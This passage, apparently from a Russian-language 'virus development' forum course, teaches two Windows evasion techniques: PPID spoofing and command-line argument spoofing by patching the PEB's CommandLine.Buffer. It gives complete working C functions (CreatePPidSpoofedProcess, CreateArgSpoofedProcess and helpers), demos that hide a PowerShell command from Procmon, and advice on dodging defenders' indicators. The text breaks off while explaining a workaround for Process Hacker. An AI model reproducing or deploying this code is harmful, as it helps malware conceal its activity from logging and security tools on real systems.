StartupInfo — это та же структура, которая использовалась в предыдущих статьях для создания нового процесса. Обратитесь к статье <a href="https://ru-sfera.pw/threads/razrabotka-virusov-19-izuchaem-texniku-apc-injection.4451/" target="_blank" class="link link--external" rel="noopener">про APC</a> для повторения.<br />
Единственный элемент, который нужно установить, это cb, равный sizeof(STARTUPINFOEX).<br />
<br />
lpAttributeList создается с использованием WinAPI InitializeProcThreadAttributeList. Это структура данных списка атрибутов, которая обсуждается подробнее в следующем разделе.<br />
<br />
<b>Инициализация списка атрибутов</b><br />
<br />
Функция InitializeProcThreadAttributeList представлена ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags,         // NULL (зарезервировано)
  [in, out]       PSIZE_T                      lpSize
);</code></pre>
	</div>
</div><br />
Чтобы передать список атрибутов, который изменяет родительский процесс созданного дочернего процесса, сначала создайте список атрибутов с использованием WinAPI InitializeProcThreadAttributeList. Этот API инициализирует указанный список атрибутов для создания процесса и потока. Согласно документации Microsoft, InitializeProcThreadAttributeList должен вызываться дважды:<br />
<ol>
<li data-xf-list-type="ol">Первый вызов InitializeProcThreadAttributeList должен иметь значение NULL для параметра lpAttributeList. Этот вызов используется для определения размера списка атрибутов, который будет получен из параметра lpSize.</li>
<li data-xf-list-type="ol">Второй вызов InitializeProcThreadAttributeList должен указать действующий указатель для параметра lpAttributeList. Значение lpSize следует предоставить на этот раз в качестве ввода. Этот вызов инициализирует список атрибутов.</li>
</ol>dwAttributeCount будет установлен в 1, так как нужен только один список атрибутов.<br />
<br />
<b>Обновление списка атрибутов</b><br />
<br />
После успешной инициализации списка атрибутов используйте WinAPI UpdateProcThreadAttribute, чтобы добавить атрибуты в список. Функция представлена ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // возвращаемое значение от InitializeProcThreadAttributeList
  [in]            DWORD                        dwFlags,           // NULL (зарезервировано)
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,           // указатель на значение атрибута
  [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
  [out, optional] PVOID                        lpPreviousValue,   // NULL (зарезервировано)
  [in, optional]  PSIZE_T                      lpReturnSize       // NULL (зарезервировано)
);</code></pre>
	</div>
</div><br />
Attribute - Этот флаг критически важен для PPID spoofing и указывает, что следует обновить в списке атрибутов. В этом случае он должен быть установлен на флаг PROC_THREAD_ATTRIBUTE_PARENT_PROCESS для обновления информации о родительском процессе.<br />
<br />
Флаг PROC_THREAD_ATTRIBUTE_PARENT_PROCESS указывает родительский процесс потока. В общем случае родительский процесс потока — это процесс, который создал поток. Если поток создается с использованием функции CreateThread, родительский процесс — это тот, который вызвал функцию CreateThread. Если поток создается как часть нового процесса с использованием функции CreateProcess, родительский процесс — это новый процесс. Обновление родительского процесса потока также обновит родительский процесс связанного процесса.<br />
<br />
lpValue - Дескриптор родительского процесса.<br />
<br />
cbSize - Размер значения атрибута, указанного параметром lpValue. Это будет установлено в sizeof(HANDLE).<br />
<br />
<b>Логика реализации</b><br />
<br />
Шаги ниже подводят итог необходимых действий для выполнения PPID spoofing.<br />
<ol>
<li data-xf-list-type="ol">Вызывается CreateProcessA с флагом EXTENDED_STARTUPINFO_PRESENT для обеспечения дополнительного контроля над созданным процессом.</li>
<li data-xf-list-type="ol">Создается структура STARTUPINFOEXA, которая содержит список атрибутов, LPPROC_THREAD_ATTRIBUTE_LIST.</li>
<li data-xf-list-type="ol">Вызывается InitializeProcThreadAttributeList для инициализации списка атрибутов. Функцию следует вызывать дважды, первый раз определяет размер списка атрибутов, а следующий вызов осуществляет инициализацию.</li>
<li data-xf-list-type="ol">UpdateProcThreadAttribute используется для обновления атрибутов, устанавливая флаг PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, который позволяет пользователю указать родительский процесс потока.</li>
</ol><br />
Функция PPID Spoofing<br />
<br />
CreatePPidSpoofedProcess — это функция, которая создаёт процесс с поддельным PPID.<br />
<br />
Функция принимает 5 аргументов:<br />
<br />
hParentProcess - дескриптор процесса, который станет родителем для только что созданного процесса.<br />
<br />
lpProcessName - имя процесса, который необходимо создать.<br />
<br />
dwProcessId - указатель на DWORD, который принимает PID новосозданного процесса.<br />
<br />
hProcess - указатель на HANDLE, который принимает дескриптор только что созданного процесса.<br />
<br />
hThread - указатель на HANDLE, который принимает дескриптор потока только что созданного процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    SIZE_T sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pThreadAttList = NULL;

    STARTUPINFOEXA SiEx = { 0 };
    PROCESS_INFORMATION Pi = { 0 };

    RtlSecureZeroMemory(&amp;SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

    // Установка размера структуры
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!GetEnvironmentVariableA(&quot;WINDIR&quot;, WnDr, MAX_PATH)) {
        printf(&quot;[!] GetEnvironmentVariableA Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    sprintf(lpPath, &quot;%s\\System32\\%s&quot;, WnDr, lpProcessName);

    // Это завершится ошибкой ERROR_INSUFFICIENT_BUFFER, как и ожидалось
    InitializeProcThreadAttributeList(NULL, 1, NULL, &amp;sThreadAttList);

    // Выделение достаточного объема памяти
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Повторный вызов InitializeProcThreadAttributeList, но передача правильных параметров
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &amp;sThreadAttList)) {
        printf(&quot;[!] InitializeProcThreadAttributeList Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf(&quot;[!] UpdateProcThreadAttribute Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Установка элемента LPPROC_THREAD_ATTRIBUTE_LIST в SiEx равным тому, что было создано с использованием UpdateProcThreadAttribute - то есть родительский процесс
    SiEx.lpAttributeList = pThreadAttList;

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &amp;SiEx.StartupInfo, &amp;Pi)) {
        printf(&quot;[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    // Очистка
    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Демо</b><br />
<br />
Создание дочернего процесса, RuntimeBroker.exe, с родителем svchost.exe, который имеет PID 21956. Обратите внимание, что этот процесс svchost.exe выполняется с обычными привилегиями.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784020245.png"
		data-src="https://osint42.org/attachments/1746784020245-png.162/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784020245-png.162/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784020245.png"
			title="1746784020245.png"
			width="1244" height="497" loading="lazy" />
	</div><br />
<br />
PPID Spoofing успешно выполнен. Процесс RuntimeBroker.exe выглядит так, как будто он был запущен svchost.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784027530.png"
		data-src="https://osint42.org/attachments/1746784027530-png.163/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784027530-png.163/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784027530.png"
			title="1746784027530.png"
			width="1240" height="711" loading="lazy" />
	</div><br />
<br />
Демо 2 - Обновление текущего каталога<br />
<br />
Заметьте, как в предыдущем демо значение &quot;Current Directory&quot; указывает на каталог исполняемого файла PPidSpoofing.exe.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784034641.png"
		data-src="https://osint42.org/attachments/1746784034641-png.164/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784034641-png.164/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784034641.png"
			title="1746784034641.png"
			width="872" height="118" loading="lazy" />
	</div><br />
<br />
Это может легко стать индикатором заражения, и решения безопасности или защитники могут быстро пометить эту аномалию. Чтобы исправить это, просто установите параметр lpCurrentDirectory в CreateProcess WinAPI на менее подозрительный каталог, например, &quot;C:\Windows\System32&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784040876.png"
		data-src="https://osint42.org/attachments/1746784040876-png.165/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784040876-png.165/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784040876.png"
			title="1746784040876.png"
			width="1284" height="651" loading="lazy" />
	</div><br />
<br />
<br />
<b>Давайте теперь ещё рассмотрим одну интересную технику.)<br />
<br />
Подмена аргумента процесса</b> - это техника, используемая для скрытия командной строки нового процесса с целью выполнения команд без их раскрытия службам регистрации, таким как Procmon.<br />
<br />
На изображении ниже показана команда powershell.exe -c calc.exe, которая регистрируется в Procmon. Цель этого раздела - выполнить команду powershell.exe -c calc.exe, чтобы она не была успешно зарегистрирована в Procmon.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784049732.png"
		data-src="https://osint42.org/attachments/1746784049732-png.166/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784049732-png.166/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784049732.png"
			title="1746784049732.png"
			width="1536" height="711" loading="lazy" />
	</div><br />
<br />
<br />
<b>Обзор PEB (Блок параметров выполнения процесса)</b><br />
<br />
Первый шаг к выполнению обмана аргумента - понять, где хранятся аргументы внутри процесса. Напомним структуру PEB, которая была объяснена в начале курса, она содержит информацию о процессе. Более конкретно, структура RTL_USER_PROCESS_PARAMETERS внутри PEB содержит член CommandLine, который содержит аргументы командной строки. Структура RTL_USER_PROCESS_PARAMETERS показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</code></pre>
	</div>
</div><br />
CommandLine определен как UNICODE_STRING.<br />
<br />
<b>Структура UNICODE_STRING</b><br />
<br />
Структура UNICODE_STRING показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;</code></pre>
	</div>
</div><br />
Элемент Buffer будет содержать содержимое аргументов командной строки. Имея это в виду, можно получить доступ к аргументам командной строки, используя PEB-&gt;ProcessParameters.CommandLine.Buffer как строку широких символов.<br />
<br />
<b>Как выполнить подмену аргументов процесса</b><br />
Для выполнения подмена аргументов командной строки сначала необходимо создать целевой процесс в приостановленном состоянии, передавая фиктивные аргументы, которые не считаются подозрительными. Прежде чем возобновить процесс, строку PEB-&gt;ProcessParameters.CommandLine.Buffer необходимо заменить на желаемую строку-полезную нагрузку, которая заставит службы регистрации регистрировать фиктивные аргументы, а не фактические аргументы командной строки, которые будут выполнены. Для выполнения этой процедуры необходимо выполнить следующие шаги:<br />
<ol>
<li data-xf-list-type="ol">Создать целевой процесс в приостановленном состоянии.</li>
<li data-xf-list-type="ol">Получить удаленный адрес PEB созданного процесса.</li>
<li data-xf-list-type="ol">Прочитать удаленную структуру PEB из созданного процесса.</li>
<li data-xf-list-type="ol">Прочитать удаленную структуру PEB-&gt;ProcessParameters из созданного процесса.</li>
<li data-xf-list-type="ol">Заменить строку ProcessParameters.CommandLine.Buffer и перезаписать ее полезным полезным данными для выполнения.</li>
<li data-xf-list-type="ol">Возобновить процесс.</li>
</ol>Длина аргумента полезной нагрузки, записываемого в Peb-&gt;ProcessParameters.CommandLine.Buffer во время выполнения, должна быть меньше или равна длине созданного фиктивного аргумента при создании приостановленного процесса. Если реальный аргумент больше, он может перезаписать байты за пределами фиктивного аргумента, что может привести к сбою процесса. <b>Для избежания этого всегда следует убедиться, что фиктивный аргумент больше, чем аргумент, который будет выполнен</b>.<br />
<br />
Получение удаленного адреса PEB<br />
<br />
Для получения адреса PEB удаленного процесса необходимо использовать NtQueryInformationProcess с флагом ProcessBasicInformation.<br />
<br />
Как указано в документации, при использовании флага ProcessBasicInformation NtQueryInformationProcess вернет структуру PROCESS_BASIC_INFORMATION, которая выглядит следующим образом:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS    ExitStatus;
    PPEB        PebBaseAddress;                // Указывает на структуру PEB.
    ULONG_PTR   AffinityMask;
    KPRIORITY   BasePriority;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;</code></pre>
	</div>
</div><br />
Обратите внимание, что поскольку NtQueryInformationProcess - это системный вызов, его нужно вызывать с использованием GetModuleHandle и GetProcAddress, как показано в предыдущих статьях.<br />
<br />
<b>Чтение удаленной структуры PEB</b><br />
<br />
После получения адреса PEB для удаленного процесса можно прочитать структуру PEB с помощью функции WinAPI ReadProcessMemory, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
);</code></pre>
	</div>
</div><br />
ReadProcessMemory используется для чтения данных из указанного адреса, указанного в параметре lpBaseAddress. Функцию нужно вызвать дважды:<br />
<ol>
<li data-xf-list-type="ol">Первый вызов используется для чтения структуры PEB, передавая адрес PEB, полученный из вывода NtQueryInformationProcess, в параметр lpBaseAddress.</li>
<li data-xf-list-type="ol">Затем он вызывается во второй раз для чтения структуры RTL_USER_PROCESS_PARAMETERS, передавая ее адрес в параметр lpBaseAddress. Обратите внимание, что структура RTL_USER_PROCESS_PARAMETERS находится внутри структуры PEB при первом вызове. Помните, что эта структура содержит член CommandLine, который необходим для выполнения подмены аргументов.</li>
</ol><b>Размер RTL_USER_PROCESS_PARAMETERS</b><br />
<br />
При чтении структуры RTL_USER_PROCESS_PARAMETERS необходимо читать больше байт, чем sizeof(RTL_USER_PROCESS_PARAMETERS). Это связано с тем, что реальный размер этой структуры зависит от размера фиктивного аргумента. Для обеспечения чтения всей структуры дополнительные байты должны быть прочитаны. Это делается в образце кода, где читается дополнительных 225 байтов.<br />
<br />
<b>Патчинг CommandLine.Buffer</b><br />
<br />
Получив структуру RTL_USER_PROCESS_PARAMETERS, можно получить доступ и патчить CommandLine.Buffer. Для этого будет использоваться функция WinAPI WriteProcessMemory, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,          // Что перезаписывается (CommandLine.Buffer)
  [in]  LPCVOID lpBuffer,               // Что записывается (новый аргумент процесса)
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);</code></pre>
	</div>
</div><ul>
<li data-xf-list-type="ul">pBaseAddress должен быть установлен на то, что перезаписывается, что в данном случае является CommandLine.Buffer.</li>
<li data-xf-list-type="ul">lpBuffer - это данные, которые будут перезаписывать фиктивные аргументы. Он должен быть строкой широких символов для замены CommandLine.Buffer, который также является строкой широких символов.</li>
<li data-xf-list-type="ul">Параметр nSize - это размер буфера для записи в байтах. Он должен быть равен длине строки, которая записывается, умноженной на размер WCHAR плюс 1 (для нулевого символа).</li>
</ul>lstrlenW(NewArgument) * sizeof(WCHAR) + 1 Вспомогательные функции<br />
<br />
Код в этой статье использует две вспомогательные функции, которые читают и записывают данные из и в целевой процесс.<br />
<br />
<b>Функция ReadFromTargetProcess</b><br />
<br />
Вспомогательная функция ReadFromTargetProcess вернет выделенную кучу, содержащую буфер, прочитанный из целевого процесса. Сначала она читает структуру PEB, а затем использует ее для получения структуры RTL_USER_PROCESS_PARAMETERS. Функция ReadFromTargetProcess показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

    SIZE_T    sNmbrOfBytesRead    = NULL;

    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &amp;sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
        printf(&quot;[!] ReadProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        printf(&quot;[i] Bytes Read : %d Of %d \n&quot;, sNmbrOfBytesRead, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция WriteToTargetProcess</b><br />
<br />
Вспомогательная функция WriteToTargetProcess передает соответствующие параметры функции WriteProcessMemory и проверяет вывод. Функция WriteToTargetProcess показана ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten    = NULL;

    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &amp;sNmbrOfBytesWritten) || sNmбрOfBytesWritten != dwBufferSize) {
        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
        printf(&quot;[i] Bytes Written : %d Of %d \n&quot;, sNmbrOfBytesWritten, dwBufferSize);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Функция подмены аргумента процесса<br />
<br />
CreateArgSpoofedProcess </b>- это функция, выполняющая подмен аргумента командной строки во вновь созданном процессе.<br />
<br />
Функция требует 5 аргументов:<br />
<br />
szStartupArgs - Фиктивные аргументы. Они должны быть безвредными.<br />
<br />
szRealArgs - Реальные аргументы для выполнения.<br />
<br />
dwProcessId - Указатель на DWORD, который получает PID.<br />
<br />
hProcess - Указатель на HANDLE, который получает дескриптор процесса.<br />
<br />
hThread - Указатель на DWORD, который получает дескриптор потока процесса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    NTSTATUS                      STATUS   = NULL;

    WCHAR                         szProcess [MAX_PATH];

    STARTUPINFOW                  Si       = { 0 };
    PROCESS_INFORMATION           Pi       = { 0 };

    PROCESS_BASIC_INFORMATION     PBI      = { 0 };
    ULONG                         uRetern  = NULL;

    PPEB                          pPeb     = NULL;
    PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;

    RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFOW));
    RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOW);

    // Получение адреса функции NtQueryInformationProcess
    fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L&quot;NTDLL&quot;), &quot;NtQueryInformationProcess&quot;);
    if (pNtQueryInformationProcess == NULL)
        return FALSE;

    lstrcpyW(szProcess, szStartupArgs);

    if (!CreateProcessW(
        NULL,
        szProcess,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,      // создание процесса приостановленным и без окна
        NULL,
        L&quot;C:\\Windows\\System32\\&quot;,               // можно использовать GetEnvironmentVariableW для получения этого программно
        &amp;Si,
        &amp;Pi)) {
        printf(&quot;\t[!] CreateProcessA Failed with Error : %d \n&quot;, GetLastError());
        return FALSE;
    }

    // Получение структуры PROCESS_BASIC_INFORMATION удаленного процесса, которая содержит адрес PEB
    if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &amp;PBI, sizeof(PROCESS_BASIC_INFORMATION), &amp;uRetern)) != 0) {
        printf(&quot;\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Чтение структуры PEB из ее базового адреса в удаленном процессе
    if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &amp;pPeb, sizeof(PEB))) {
        printf(&quot;\t[!] Failed To Read Target&#039;s Process Peb \n&quot;);
        return FALSE;
    }

    // Чтение структуры RTL_USER_PROCESS_PARAMETERS из PEB удаленного процесса
    // Читается дополнительных 0xFF байтов, чтобы убедиться, что мы достигли указателя CommandLine.Buffer
    // 0xFF - это 255, но может быть любым, на ваш выбор
    if (!ReadFromTargetProcess(Pi.hProcess, pPeb-&gt;ProcessParameters, &amp;pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
        printf(&quot;\t[!] Failed To Read Target&#039;s Process ProcessParameters \n&quot;);
        return FALSE;
    }

    // Запись реальных аргументов в процесс
    if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms-&gt;CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
        printf(&quot;\t[!] Failed To Write The Real Parameters\n&quot;);
        return FALSE;
    }

    // Очистка
    HeapFree(GetProcessHeap(), NULL, pPeb);
    HeapFree(GetProcessHeap(), NULL, pParms);

    // Возобновление процесса с новыми параметрами
    ResumeThread(Pi.hThread);

    // Сохранение выходных параметров
    *dwProcessId     = Pi.dwProcessId;
    *hProcess        = Pi.hProcess;
    *hThread         = Pi.hThread;

    // Проверка, все ли параметры действительны
    if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
        return TRUE;

    return FALSE;
}</code></pre>
	</div>
</div><br />
<b>Демонстрация</b><br />
<br />
powershell.exe Totally Legit Argument - это фиктивный аргумент, который будет зарегистрирован, в то время как powershell.exe -c calc.exe - это полезная нагрузка, которая будет выполнена.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784078362.png"
		data-src="https://osint42.org/attachments/1746784078362-png.167/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784078362-png.167/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784078362.png"
			title="1746784078362.png"
			width="1574" height="838" loading="lazy" />
	</div><br />
<br />
Отлично Procmon был обманут, и он зарегистрировал фиктивные аргументы командной строки. <b><u>Однако эта же техника не работает так хорошо с некоторыми инструментами</u></b>, такими как Process Hacker. Ниже показан результат подмены аргумента в Process Hacker.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784164490.png"
		data-src="https://osint42.org/attachments/1746784164490-png.170/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784164490-png.170/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784164490.png"
			title="1746784164490.png"
			width="1477" height="819" loading="lazy" />
	</div><br />
<br />
Легитимные аргументы отображаются Process Hacker, вместе с фрагментом фиктивного аргумента. В этом разделе мы проанализируем, почему это происходит, и предоставим решение.<br />
<br />
<b>Анализ проблемы</b><br />
<br />
Для лучшего понимания того, почему отображаются легитимные аргументы, фиктивный аргумент будет установлен в powershell.exe AAAAAAA....<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784233648.png"
		data-src="https://osint42.org/attachments/1746784233648-png.172/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784233648-png.172/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784233648.png"
			title="1746784233648.png"
			width="1117" height="90" loading="lazy" />
	</div><br />
<br />
Проверка Process Hacker снова показывает, что регистрируются как легитимые, так и фиктивные аргументы.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784242761.png"
		data-src="https://osint42.org/attachments/1746784242761-png.173/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784242761-png.173/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784242761.png"
			title="1746784242761.png"
			width="1537" height="786" loading="lazy" />
	</div><br />
<br />
Использование PEB-&gt;ProcessParameters.CommandLine.Buffer для перезаписи полезной нагрузки может быть обнаружено Process Hacker и другими инструментами, такими как Process Explorer, потому что эти инструменты используют NtQueryInformationProcess для чтения аргументов командной строки процесса во время выполнения. <b>Поскольку это происходит во время выполнения, они могут видеть, что в данный момент находится в PEB-&gt;ProcessParameters.CommandLine.Buffer.<br />
<br />
Решение</b><br />
<br />
Эти инструменты считывают CommandLine.Buffer до длины, указанной в CommandLine.Length. Они не полагаются на то, что CommandLine.Buffer завершается нулевым символом, потому что Microsoft утверждает в своей документации, что UNICODE_STRING.Buffer может не быть завершен нулевым символом.<br />
<br />
